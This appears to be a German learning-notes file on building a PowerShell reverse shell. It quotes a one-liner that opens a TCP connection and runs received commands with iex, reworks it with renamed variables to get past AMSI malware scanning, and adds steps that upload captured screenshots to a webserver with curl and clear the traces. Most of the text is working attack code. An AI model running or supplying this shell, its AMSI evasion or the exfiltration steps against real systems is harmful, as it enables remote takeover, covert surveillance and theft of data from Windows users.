# Learning zur Reverse Shell



One Liner Reverse Shell in einer Powershell
```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
Quelle: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#powershell

In Powershell umgeschrieben sieht der Code so aus:

```powershell
New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);
$stream = $client.GetStream()

[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2  = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()}
    
$client.Close()
```

Führt man den Code in der Powershell aus. Kommt folgeden Fehlermeldung:

![image](https://github.com/user-attachments/assets/a9f07a42-b9cc-44c4-8627-e6568bd53662)

Die Fehlermeldung wird durch das Antimalware Scan Interface (kurz. AMSI) aufgerufen. AMSI analysiert den eingegeben Code auf Strukturen bekannter Schadsoftware. [Microsoft](https://learn.microsoft.com/de-de/windows/win32/amsi/antimalware-scan-interface-portal) nutzt AMSI für:
- Benutzerkontensteuerung bzw. UAC (Erhöhung von Rechten für EXE-, COM-, MSI- oder ActiveX-Installation)
- PowerShell (Skripts, interaktive Verwendung und dynamische Codeauswertung)
- Windows Script Host („wscript.exe“ und „cscript.exe“)
- JavaScript und VBScript
- VBA-Makros in Office

AMSI ist kein unbekanntes System, weshalb es einigen Anwendern gelungen einen Bypass zu erschaffen. Dazu wird die `amsi.dll` mit dem Ziel manipuliert, dass bosthafter Code als sauber zu indentifiziert wird. Dies ist ein Thema für sich, weshalb für diese Arbeit ein anderer Bypass gewählt wurde. Für die Analyse wurde der Code Zeile für Zeile ausgeführt. So konnte bestimmt werden, an welcher Stelle AMSI ausschlägt:

```
$sendback2  = $sendback + "PS " + (pwd).Path + "> "
```
"pwd": Gibt den aktuellen Pfad wieder. Es scheint, als ist "pwd" in diesem Kontext ein Signal für Schadsoftware/Skript. Alternative kann in Powershell der Befehl ```GET-Location``` ausgeführt werden.

Durch Trial and Error ensteht der folgende angepasste Powershell-Code:

```powershell
$hmGuXO='127.0.0.1'
$port = 4422
$client = New-Object System.Net.Sockets.TCPClient($hmGuXO,$port);
$SAAAD = $client.GetStream()

[byte[]]$bytes = 0..65535|%{0}

$sendbyte = ([text.encoding]::ASCII).GetBytes('PS '+(Get-Location).Path+'> ')
$SAAAD.Write($sendbyte,0,$sendbyte.Length)

while(($i = $SAAAD.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
   $sendback2  = $sendback + "PS " + (pwd).Path + "> "
   $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
  $SAAAD.Write($sendbyte,0,$sendbyte.Length)
 $SAAAD.Flush()}
    
$client.Close()

```


---
28.01.: Code angepasst vom Server -> Upload zum Webserver mit 
```
curl -X POST -F "file=@C:/Users/admin/Desktop/screenshot.png" http://127.0.0.1:5000/upload
```
---
29.01.: Code angepasst vom Server -> Screenshot wird in einem Temporären Ordner gespeichert

Der erstelle Screenshot soll in einem temporären Ordner gespeichert werden. Nachdem der Screenshot an den Webserver geschickt wurde, sollen alle Spuren beseitigt werden. 
```cmd
if(-not(Test-Path -Path "$env:TEMP\screenshot")){mkdir $env:TEMP\screenshot}
```
Die "normal" gestartete Powershell hat nicht die Berechtigung überall Ordner zu erstellen. Mit folgendem [dir](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dir)-Befehl werden Ordner aufgelistet, die eine "write"-Berechtigung besitzen:
```cmd
dir /ad-r
```
/a[[:]<attributes>]	Displays only the names of those directories and files with your specified attributes. If you don't use this parameter, the command displays the names of all files except hidden and system files. If you use this parameter without specifying any attributes, the command displays the names of all files, including hidden and system files. The list of possible attributes values are:

- d: Directories
- r: Read-only files
  
You can use any combination of these values, but don't separate your values using spaces. Optionally you can use a colon (:) separator, or you can use a hyphen (-) as a prefix to mean, "not". For example, using the -s attribute won't show the system files.
